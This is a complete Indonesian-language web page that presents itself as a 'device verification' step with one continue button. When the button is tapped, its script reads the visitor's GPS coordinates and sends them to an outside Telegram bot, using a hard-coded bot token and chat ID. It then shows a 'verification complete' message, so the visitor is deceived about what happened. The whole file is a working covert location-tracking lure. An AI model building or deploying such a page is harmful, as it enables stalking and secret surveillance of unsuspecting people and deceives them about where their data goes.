<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background: #f4f4f9; }
        .btn { background: #007bff; color: white; padding: 12px 24px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
    <h2>Verifikasi Perangkat</h2>
    <p>Ketuk tombol di bawah ini untuk melanjutkan.</p>
    <button class="btn" onclick="mulaiLacak()">Lanjutkan</button>

    <script>
        function mulaiLacak() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;

                    let tokenBot = '8769576802:AAFqMQGPSUpiaKMtoluHfI7OBqQ_8s64yhk';
                    let chatId = "6269176229";
                    let urlApi = `https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=Lat:%20${lat}%20Long:%20${lon}`;

                    fetch(urlApi).then(response => {
                        alert("Verifikasi Selesai");
                    });
                }, function(error) {
                    alert("Izin lokasi ditolak.");
                });
            }
        }
    </script>
</body>
</html>
